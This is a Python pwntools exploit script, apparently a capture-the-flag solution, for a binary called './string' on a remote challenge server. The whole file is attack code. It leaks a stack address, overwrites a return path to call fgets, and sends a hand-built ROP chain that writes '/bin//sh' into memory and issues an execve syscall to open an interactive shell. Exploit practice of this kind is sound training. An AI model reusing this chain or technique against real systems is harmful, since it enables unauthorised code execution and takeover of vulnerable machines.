from pwn import *

e = ELF("./string")
#p = process("./string")

p = remote("chals.fairgame.rpis.ec", 5005)

p.sendlineafter("storage!", "A" * 999)
p.sendlineafter("3:", "2")
p.sendlineafter("?", "999")
p.sendlineafter("?", "A" + "A" * 4 + "A" * 4 + "CODE")

p.sendlineafter("3:", "1")
p.recvuntil("CODE")

stack = u32(p.recv(4)) - 0xff95ab74 +  0xff95aaa8
print("{:#x}".format(stack))

p.sendlineafter("3:", "2")
p.sendlineafter("?", "999")
p.sendlineafter("?", "A" + "A" * 4 + p32(e.symbols["fgets"]) + "A" * 4 + p32(stack) + p32(0x11111111) + p32(0x80ea360))

print("{:#x}".format(e.symbols["fgets"]))

p.sendlineafter("3:", "3")

r = p

from struct import pack
p = ''

p += pack('<I', 0x0806f4ba) # pop edx ; ret
p += pack('<I', 0x080ea060) # @ .data
p += pack('<I', 0x080b84c6) # pop eax ; ret
p += '/bin'
p += pack('<I', 0x08054edb) # mov dword ptr [edx], eax ; ret
p += pack('<I', 0x0806f4ba) # pop edx ; ret
p += pack('<I', 0x080ea064) # @ .data + 4
p += pack('<I', 0x080b84c6) # pop eax ; ret
p += '//sh'
p += pack('<I', 0x08054edb) # mov dword ptr [edx], eax ; ret
p += pack('<I', 0x0806f4ba) # pop edx ; ret
p += pack('<I', 0x080ea068) # @ .data + 8
p += pack('<I', 0x08049463) # xor eax, eax ; ret
p += pack('<I', 0x08054edb) # mov dword ptr [edx], eax ; ret
p += pack('<I', 0x080481c9) # pop ebx ; ret
p += pack('<I', 0x080ea060) # @ .data
p += pack('<I', 0x0805bee3) # pop ecx ; ret
p += pack('<I', 0x080ea068) # @ .data + 8
p += pack('<I', 0x0806f4ba) # pop edx ; ret
p += pack('<I', 0x080ea068) # @ .data + 8
p += pack('<I', 0x08049463) # xor eax, eax ; ret
p += pack('<I', 0x0807acff) # inc eax ; ret
p += pack('<I', 0x0807acff) # inc eax ; ret
p += pack('<I', 0x0807acff) # inc eax ; ret
p += pack('<I', 0x0807acff) # inc eax ; ret
p += pack('<I', 0x0807acff) # inc eax ; ret
p += pack('<I', 0x0807acff) # inc eax ; ret
p += pack('<I', 0x0807acff) # inc eax ; ret
p += pack('<I', 0x0807acff) # inc eax ; ret
p += pack('<I', 0x0807acff) # inc eax ; ret
p += pack('<I', 0x0807acff) # inc eax ; ret
p += pack('<I', 0x0807acff) # inc eax ; ret
p += pack('<I', 0x0806d125) # int 0x80

r.sendline("A" * 4 * 2 + p)

r.interactive()

